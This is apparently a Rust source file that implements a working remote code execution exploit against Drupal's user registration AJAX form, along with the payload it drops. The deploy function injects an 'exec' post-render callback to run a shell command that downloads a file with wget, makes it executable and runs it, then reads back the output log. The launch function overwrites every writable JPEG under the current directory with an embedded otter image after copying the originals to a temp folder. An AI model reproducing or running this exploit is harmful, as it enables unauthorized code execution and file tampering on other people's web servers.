extern crate log;
extern crate reqwest;
extern crate walkdir;

use log::info;
use reqwest::{get, Client};
use std::env::current_dir;
use std::env::temp_dir;
use std::ffi::OsStr;
use std::fs::{copy, create_dir_all, File};
use std::io::prelude::*;
use std::path::PathBuf;
use walkdir::WalkDir;

pub async fn deploy(target: &str, payload: &str) -> Result<String, Box<dyn std::error::Error>> {
    let client = Client::new();
    let endpoint = "user/register";
    let query = "element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
    let url = format!("http://{}/{}?{}", target, endpoint, query);
    let injection = format!(
        "echo 'wget {} -O ~/payload && chmod +x ~/payload && ~/payload launch' | bash > \"$(pwd)/payload.log\" 2>&1",
        payload
    );
    let req = [
        ("form_id", "user_register_form"),
        ("_drupal_ajax", "1"),
        ("mail[#post_render][]", "exec"),
        ("mail[#type]", "markup"),
        ("mail[#markup]", &injection),
    ];

    info!("Sending injection {} to '{}'", injection, url);
    let resp = client.post(&url).form(&req).send().await?;

    resp.error_for_status()?;

    Ok(get(&format!("http://{}/payload.log", target))
        .await?
        .text()
        .await?)
}

pub fn launch() -> Result<(), Box<dyn std::error::Error>> {
    let otter = include_bytes!("../res/otter.jpg");
    let images = get_images(&current_dir()?);
    let mut tmpdir = temp_dir();
    tmpdir.push("otter");

    info!("Creating tmp directory {:#?}", tmpdir);
    create_dir_all(&tmpdir)?;

    for image in images {
        let mut dest = tmpdir.clone();
        let image_name = match image.file_name() {
            Some(name) => name,
            None => return Err("missing filename.".into()),
        };

        dest.push(image_name);
        info!("Found image {:#?} copying to {:#?}", image, dest);
        copy(&image, &dest)?;

        info!("Replacing {:#?} with otter", image_name);
        let mut buf = File::create(&image)?;
        buf.write_all(otter)?;
        buf.flush()?;
    }

    Ok(())
}

fn get_images(dir: &PathBuf) -> impl Iterator<Item = PathBuf> {
    WalkDir::new(dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| !e.file_type().is_dir())
        .filter(|e| match e.metadata() {
            Ok(m) => !m.permissions().readonly(),
            Err(_) => false,
        })
        .map(|e| e.into_path())
        .filter(|p| match p.extension().and_then(OsStr::to_str) {
            Some("jpeg") => true,
            Some("jpg") => true,
            _ => false,
        })
}
